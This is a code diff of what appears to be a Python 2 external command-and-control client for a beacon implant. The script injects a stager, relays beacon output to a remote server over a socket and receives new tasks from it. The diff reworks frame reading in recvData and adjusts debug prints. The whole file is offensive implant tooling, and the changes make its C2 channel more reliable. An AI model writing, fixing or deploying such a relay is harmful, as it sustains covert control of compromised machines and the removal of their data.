@@ -48,18 +48,35 @@ def sendData(sock, data):
 
 def recvData(sock):
 	# Need to read the first 4 bytes of the frame to determine size
-	frameSize = ""
-	while len(frameSize) != 4:
-		frameSize = sock.recv(4)
+	# frameSize = ""
+	# while len(frameSize) != 4:
+	# 	frameSize = sock.recv(4)
 
-	dataSize = struct.unpack('<I', frameSize)[0]
-	print "dataSize = " + str(dataSize) # DEBUG
-	# sock.settimeout(SOCK_TIME_OUT)
-	newTask = sock.recv(dataSize)
-	print "newTask = " + str(newTask) #DEBUG
+	# dataSize = struct.unpack('<I', frameSize)[0]
+	# print "dataSize = " + str(dataSize) # DEBUG
+	# # sock.settimeout(SOCK_TIME_OUT)
+	# newTask = sock.recv(dataSize)
+	# print "newTask = " + str(newTask) #DEBUG
 
-	decoded_task = decode(newTask)
-	return decoded_task
+	# decoded_task = decode(newTask)
+	# return decoded_task
+
+	# Going to try a new method of simply reusing the writeframetoc2 logic
+	# ### 5 mins later...
+	# ### This seems to be working...
+	try:
+		chunk = sock.recv(4)
+	except:
+		return("")
+	if len(chunk) < 4: # wtf does this line even do?
+		return() #wtf does this line even do?
+	slen = struct.unpack('<I', chunk)[0]
+	chunk = sock.recv(slen)
+	while len(chunk) < slen:
+		chunk = chunk + sock.recv(slen - len(chunk))
+	decoded_data = decode(chunk)
+	return decoded_data
+
 # </transport functions>
 
 
@@ -125,8 +142,9 @@ def interact(sock, handle_beacon):
 		else:
 			print "Received %d bytes from pipe" % (len(chunk))
 		if len(chunk) > 1:
-			print "relaying chunk to server"
+			print "relaying chunk to server: "
 			# LOGIC TO SEND A CHUNK OF DATA THROUGH THE SOCKET GOES HERE
+			print chunk
 			sendData(sock, chunk) # DEBUG/TODO
 
 		# LOGIC TO CHECK FOR A NEW TASK
@@ -145,6 +163,5 @@ sock = prepTransport()
 # Get and inject the stager
 handle_beacon = go(sock)
 
-print "if you can't see this, we didn't make it"
 # Run the main loop
 interact(sock, handle_beacon)
